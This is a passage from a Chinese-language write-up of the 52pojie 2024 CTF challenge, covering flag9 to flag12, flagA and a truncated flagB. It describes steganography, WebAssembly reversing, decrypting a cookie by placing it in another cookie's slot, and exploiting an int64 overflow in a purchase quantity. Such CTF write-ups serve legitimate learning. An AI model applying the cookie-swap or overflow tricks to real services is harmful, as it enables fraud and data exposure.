700;">__\///\\\\\<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\//\\\_</span>\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>\/\\\\\\\\\\\\\\\<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\//\\\_</span><span style="font-style: italic;">_/\\\\\_</span>__</span><span style="font-weight: 700;">__....<br />q..........__</span><span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_\/////////<span style="font-weight: 700;">___\////////\//__</span>_</span>\////////<span style="font-weight: 700;">____</span><span style="font-style: italic;">_\///////////<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\/////__</span>\///<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>\///<span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\///__</span>\///////////////<span style="font-weight: 700;">__\///__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\///__</span>\/////<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__...<br />F...........__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>..<br />}............<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_.</span></span></code></pre><p><code style="font-family: SFMono-Regular, Consolas, ;">flag9{KHTALK}</code></p><h2>flag10</h2><p>回到flag4那里下载到的<code style="font-family: SFMono-Regular, Consolas, ;">flag4_flag10.png</code></p><p>既然是一个png，png有个特点是有多个颜色通道，其余颜色通道内可能还有内容</p><blockquote><p style="margin-bottom: 15px;">思路来源：PNG - CTF Wiki (ctf-wiki.org)，LSB部分</p><p style="margin-bottom: 15px;">PNG采用LSB隐写隐藏内容也是个ctf常见套路</p></blockquote><p>这里使用一个工具Stegsolve，来查看不同颜色通道的内容</p><p>下载地址：http://www.caesum.com/handbook/Stegsolve.jar</p><p>需要有java环境，java -jar运行</p><p>打开图片，xor就能看见flag10</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b953b0ef&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJdLqblLQlNOD4m4lnwJib4HgsCkYI1Wno7hVWQntxEia3Zib8SOOlXkoSg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag10{6BxMkW}</code></p><h2>flag11</h2><p>观察网页源代码可知，要对css内两个变量取到合适的值，从而拼好图片</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ccb72419&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJial1XWl20Sv8MdW7WlzaAt77aMSUxK2uXVsVVL00namxgtUxreR5lhA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="512" /></p><p><br /></p><p>如果为了方便做题，可以考虑将网页和图片保存到本地后，在网页body内加两个拖动条来更改var1和var2，类似下方这种</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">&lt;div&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;label for=<span style="color: rgb(168, 255, 96);">"slider1"</span>&gt;</span>Variable 1:<span style="color: rgb(150, 203, 254);">&lt;/label&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;input type=<span style="color: rgb(168, 255, 96);">"range"</span> id=<span style="color: rgb(168, 255, 96);">"slider1"</span> min=<span style="color: rgb(168, 255, 96);">"0"</span> max=<span style="color: rgb(168, 255, 96);">"100"</span> value=<span style="color: rgb(168, 255, 96);">"0"</span>&gt;</span><br /><span style="color: rgb(150, 203, 254);">&lt;/div&gt;</span><br /><span style="color: rgb(150, 203, 254);">&lt;div&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;label for=<span style="color: rgb(168, 255, 96);">"slider2"</span>&gt;</span>Variable 2:<span style="color: rgb(150, 203, 254);">&lt;/label&gt;</span><br />    <span style="color: rgb(150, 203, 254);">&lt;input type=<span style="color: rgb(168, 255, 96);">"range"</span> id=<span style="color: rgb(168, 255, 96);">"slider2"</span> min=<span style="color: rgb(168, 255, 96);">"0"</span> max=<span style="color: rgb(168, 255, 96);">"100"</span> value=<span style="color: rgb(168, 255, 96);">"0"</span>&gt;</span><br /><span style="color: rgb(150, 203, 254);">&lt;/div&gt;</span><br /><br /><span style="color: rgb(150, 203, 254);">&lt;script&gt;</span><br />    <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">getElementById</span>(<span style="color: rgb(168, 255, 96);">'slider1'</span>).<span style="color: rgb(255, 255, 182);">addEventListener</span>(<span style="color: rgb(168, 255, 96);">'input'</span>, <span style="color: rgb(150, 203, 254);">function</span> () {<br />        <span style="color: rgb(198, 197, 254);">document</span>.documentElement.style.<span style="color: rgb(255, 255, 182);">setProperty</span>(<span style="color: rgb(168, 255, 96);">'--var1'</span>, <span style="color: rgb(198, 197, 254);">this</span>.value);<br />    });<br /><br />    <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">getElementById</span>(<span style="color: rgb(168, 255, 96);">'slider2'</span>).<span style="color: rgb(255, 255, 182);">addEventListener</span>(<span style="color: rgb(168, 255, 96);">'input'</span>, <span style="color: rgb(150, 203, 254);">function</span> () {<br />        <span style="color: rgb(198, 197, 254);">document</span>.documentElement.style.<span style="color: rgb(255, 255, 182);">setProperty</span>(<span style="color: rgb(168, 255, 96);">'--var2'</span>, <span style="color: rgb(198, 197, 254);">this</span>.value);<br />    });<br /><span style="color: rgb(150, 203, 254);">&lt;/script&gt;</span></code></pre><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f37a32ea&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJNsNodovc1Q53X4REQ4VP9KQS0fhOjRvGGqQxeCSibhC4HNdaa43dJ5w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>最终结果：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(168, 255, 96);">:root</span> {<br />    --var1: <span style="color: rgb(255, 115, 253);">71</span>;<br />    --var2: <span style="color: rgb(255, 115, 253);">20</span>;<br />}</code></pre><p><code style="font-family: SFMono-Regular, Consolas, ;">flag11{HPQfVF}</code></p><h2>flag12</h2><p>来到flag12页面</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5a7786f7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ7sr7A1yhIHBSTjHc0OiadvG8wTPYc4as9lTlFUP8eAJMmqAsA3Gjx3w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>看网络请求了个wasm就可以猜到这题要进行wasm逆向了</p><p>先看网页里的js逻辑</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=72c10e68&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJNOubkF9R1gsOVZlmlbwWYo57sAy9a9ia70TxssI5mwnaGUJTicEX5KuA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="874" /></p><p><br /></p><p>大致思路就是调用wasm里get_flag12函数拿到一个num，然后经过一些运算变成flag12</p><p>所以问题的关键就是拿到wasm内该函数的返回值</p><p>我不懂wasm，这里求助了GPT，尝试分析wasm的代码</p><blockquote><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(module</code> - 表示代码开始定义一个wasm模块。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(memory $memory (;0;) (export "memory") 16)</code> - 这行代码定义了一个名为$memory的内存，并将其导出为"memory"。16表示分配了16个WebAssembly 页面的内存，每个页面大小为64KiB，所以总共分配了1MiB (16 * 64KiB) 的内存空间。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(global $__stack_pointer (;0;) (mut i32) (i32.const 1048576))</code> - 定义了一个名为$__stack_pointer的全局变量，为可变的32位整数(i32)，初始值为1048576。这通常表示栈指针的起始位置。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(global $__data_end (;1;) (export "__data_end") i32 (i32.const 1048576))</code> - 定义并导出了名为"__data_end"的全局变量，它是一个32位整数值，初始值同样为1048576。这个变量标记了数据段的结束位置。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(global $__heap_base (;2;) (export "__heap_base") i32 (i32.const 1048576))</code> - 定义并导出了一个叫"__heap_base"的全局变量。它的值也是1048576，标识了堆的起始地址。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">(func $get_flag12 (;0;) (export "get_flag12") (param $var0 i32) (result i32)</code> - 这里定义了一个名为<code style="font-family: SFMono-Regular, Consolas, ;">get_flag12</code>的函数，并将其导出。该函数接受一个i32类型的参数<code style="font-family: SFMono-Regular, Consolas, ;">var0</code>，并返回一个i32类型的结果。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.const 1213159497</code> - 在函数内部，首先将常数1213159497压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.const 0</code> - 紧接着将常数0压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">local.get $var0</code> - 获取传入的参数"$var0"的值，并压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.const 1103515245</code> - 将常数1103515245压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.mul</code> - 将栈顶的两个i32类型的值相乘（即常数1103515245和参数"$var0"的值），并将结果压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.const 1</code> - 将常数1压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">i32.eq</code> - 比较栈顶的两个值是否相等（即乘法结果和常数1是否相等），并将比较结果（0或1）压入栈顶。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">select</code> - 基于栈顶的比较结果选择其下的两个值中的一个压入栈顶（如果比较结果为1，则选择1213159497，如果为0，则选择0）。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">)</code> - 函数定义的结束括号，此时函数返回栈顶的值，作为结果。</p></li></ol></blockquote><p>简单总结，"get_flag12"函数计算<code style="font-family: SFMono-Regular, Consolas, ;">($var0 * 1103515245) == 1</code>的表达式，如果计算结果为真(true)，则返回1213159497，如果为假(false)，则返回0。</p><p>显然返回0不能得到flag，那就直接取1213159497作为给js的返回值</p><p>之后js逻辑照抄原页面，放到浏览器控制台运行就有答案了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">let</span> num = <span style="color: rgb(255, 115, 253);">1213159497</span>;<br /><span style="color: rgb(150, 203, 254);">let</span> str = <span style="color: rgb(168, 255, 96);">''</span>;<br /><span style="color: rgb(150, 203, 254);">while</span> (num &gt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />    str = <span style="color: rgb(255, 255, 182);">String</span>.<span style="color: rgb(255, 255, 182);">fromCodePoint</span>(num &amp; <span style="color: rgb(255, 115, 253);">0xff</span>) + str;<br />    num &gt;&gt;= <span style="color: rgb(255, 115, 253);">8</span>;<br />}<br /><span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">`flag12{<span style="color: rgb(218, 239, 163);">${str}</span>}`</span>);</code></pre><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=39f70d08&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJwNQU4BKeJhFTqOr92BWFNPmtyuvah71iapyy1RtztLwLJgXuoOucQ0A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="414" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag12{HOXI}</code></p><p>如果想找到这个符合条件的输入值，也可以使用数学方法。</p><blockquote><p style="margin-bottom: 15px;">我们需要找到一个整数<code style="font-family: SFMono-Regular, Consolas, ;">$var0</code>，它乘以<code style="font-family: SFMono-Regular, Consolas, ;">1103515245</code>后模32位整数溢出后的结果必须等于1。虽然可以使用一个简单的循环来搜索这样的整数，不过考虑到32位整数的范围非常大，从<code style="font-family: SFMono-Regular, Consolas, ;">-2^31</code>到<code style="font-family: SFMono-Regular, Consolas, ;">2^31-1</code>，穷举可能非常耗时。</p><p style="margin-bottom: 15px;">由已知能够写下：</p><p style="margin-bottom: 15px;"><code style="font-family: SFMono-Regular, Consolas, ;">$var0 * 1103515245 ≡ 1 (mod 2^32)</code></p><p style="margin-bottom: 15px;">这意味着<code style="font-family: SFMono-Regular, Consolas, ;">1103515245</code>在模<code style="font-family: SFMono-Regular, Consolas, ;">2^32</code>意义下的逆元是我们要寻找的<code style="font-family: SFMono-Regular, Consolas, ;">$var0</code>。因此可以使用扩展欧几里得算法来寻找这个逆元。</p><p style="margin-bottom: 15px;">下面是一个Python函数，我们将使用它来寻找<code style="font-family: SFMono-Regular, Consolas, ;">1103515245</code>模<code style="font-family: SFMono-Regular, Consolas, ;">2^32</code>的乘法逆元：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">egcd</span>(a, b):<br />       <span style="color: rgb(150, 203, 254);">if</span> a == <span style="color: rgb(255, 115, 253);">0</span>:<br />           <span style="color: rgb(150, 203, 254);">return</span> (b, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">1</span>)<br />       <span style="color: rgb(150, 203, 254);">else</span>:<br />           g, y, x = egcd(b % a, a)<br />           <span style="color: rgb(150, 203, 254);">return</span> (g, x - (b // a) * y, y)<br /><br />    <span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">modinv</span>(a, m):<br />       g, x, y = egcd(a, m)<br />       <span style="color: rgb(150, 203, 254);">if</span> g != <span style="color: rgb(255, 115, 253);">1</span>:<br />           <span style="color: rgb(150, 203, 254);">raise</span> Exception(<span style="color: rgb(168, 255, 96);">'无解'</span>)<br />       <span style="color: rgb(150, 203, 254);">else</span>:<br />           <span style="color: rgb(150, 203, 254);">return</span> x % m<br /><br /><span style="color: rgb(124, 124, 124);"># 计算1103515245模2^32的逆元</span><br />modulus = <span style="color: rgb(255, 115, 253);">2</span>**<span style="color: rgb(255, 115, 253);">32</span><br />a = <span style="color: rgb(255, 115, 253);">1103515245</span><br />inverse_a = modinv(a, modulus)<br /><br />print(<span style="color: rgb(168, 255, 96);">"结果:"</span>, inverse_a)</code></pre><p style="margin-bottom: 15px;">上面的脚本首先定义了<code style="font-family: SFMono-Regular, Consolas, ;">egcd</code>函数来实现扩展欧几里得算法，并定义了<code style="font-family: SFMono-Regular, Consolas, ;">modinv</code>函数来寻找模逆。接着，我们使用<code style="font-family: SFMono-Regular, Consolas, ;">modinv</code>函数寻找<code style="font-family: SFMono-Regular, Consolas, ;">1103515245</code>在模<code style="font-family: SFMono-Regular, Consolas, ;">2^32</code>意义下的逆元。这个代码应该会返回我们所需的那个符合条件的32位整数。</p><p style="margin-bottom: 15px;">运行可得，<code style="font-family: SFMono-Regular, Consolas, ;">4005161829</code>符合题意。</p></blockquote><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=e29d73f0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJPDuXpeRfudKNjdfiaB8o6ibTjlYicic9epFThm64jRnYPiaibOwCRSJ0WLRg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="658" /></p><p><br /></p><h2>flagA</h2><p>回到https://2024challenge.52pojie.cn/</p><p>退出登录后按下f12，重新登录，查看登录过程的网络请求</p><p>可以发现，login请求的响应头放了两个cookie，<code style="font-family: SFMono-Regular, Consolas, ;">uid</code>和<code style="font-family: SFMono-Regular, Consolas, ;">flagA</code></p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ef186b26&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJuDkcoahs0oyqHPGzicbJxBP2WHnJwibLYW9mIoVbiczMeFDp805rA2CQA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>很显然，两个都是密文，需要寻找解密方法</p><p>留意到后续请求了一个uid的接口，其返回值是uid的明文</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=50566c84&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJaTq3pVKG4hYbibUQT8EM38E19BLqicZpj7VoWX9HyO2HrpBnjW9db7Vg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="743" /></p><p><br /></p><p>既然Cookie里有uid的密文，这个接口的返回值是uid的明文，那不妨直接改Cookie，把flagA的密文放到uid的位置，看看会发生什么</p><p>开发者面板的应用程序-Cookie这里提供了对Cookie的修改功能，直接替换</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6e42adfe&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJIhBWDnOrAfM8bL91leIgQcUYcP084hujqyJmks19jsKcPahFVzsCJg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1048" /></p><p><br /></p><p>随后回到网络面板，找到uid请求，右键-在新标签页打开</p><p>奇迹出现</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=698ab1fb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ20Y1BkGAXjMHN1F5Im8E0XicRjzzKScKL8vLKSsUINbR61lsn4mudYg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="475" /></p><p><br /></p><h2>flagB</h2><p>先登录，回到2048的页面</p><p>一看flagB，好家伙，需要9.9亿金币</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=cbad39d5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJuIcxSJhNPy5m6j6oFgfhbDchLHKwPTzPvYiaKMldlh6AZNbfNU339tQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="753" /></p><p><br /></p><p>简单计算下，按照之前每7分钟拿到1万金币，暴力法大概需要玩480天，明显不可取。</p><p>v我50道具给的关键词也提示了我们正确思路：溢出</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=44cba5b7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJkZ3SnVxdcZuBjW3a1cdWTQ0fQCc7rfqPhW0XIBIicEOxXC3Rdg1icGoQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="498" /></p><p><br /></p><p>接下来，就需要判断金币的数据范围是什么，构造多大的溢出</p><p>先尝试最常见的int</p><blockquote><p style="margin-bottom: 15px;">int32的最大值是2^31 - 1 = 2147483647</p><p style="margin-bottom: 15px;">int64的最大值是2^63 - 1 = 9223372036854775807</p></blockquote><p>先计算出临界值对应的数量</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">&gt;&gt;&gt; (pow(2,31)-1)/999063388<br />2.149496891582619<br />&gt;&gt;&gt; (pow(2,63)-1)/999063388<br />9232018856.5</code></pre><p>先看int32，可以尝试请求买2个和3个，结果都是“钱不够”，看来不是32位溢出</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c7268406&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJRfPztvA5Gpzah5ubU7ibmRCQNhj0jSjoC0mjZfhHGXn4Jqia4bXmJjhA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="462" /></p><p><br /></p><p>尝试int64，买9232018856个和9232018857个，看看有没有区别</p><p>9232018856个仍然提示钱不够，但9232018857个出现了另一个结果</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=85dbfd31&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJW9EQB2Whicm1SdyuVzTUhqZmI8GW2e78yLN9o3lPfQSkq1XjREPVHZQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="499" /></p><p><br /></p><p>由此可知为int64溢出</p><p>这里找到的溢出点相当于第一个向上溢出的点，所以钱会变多导致被拦截。</p><p>那么找到第一个向下溢出的点，钱就会正常减少，从而实现正常购买</p><p>那么从int64最大值开始逐渐尝试（我自己做题时是向服务器发送请求找到第一个提示钱不够而不是钱多了的点）即可获得一个符合要求值18464037713，刚好在64位内int64和28等效</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">&gt;&gt;&gt; bin(18464037713*999063388)<br /><span style="color: rgb(168, 255, 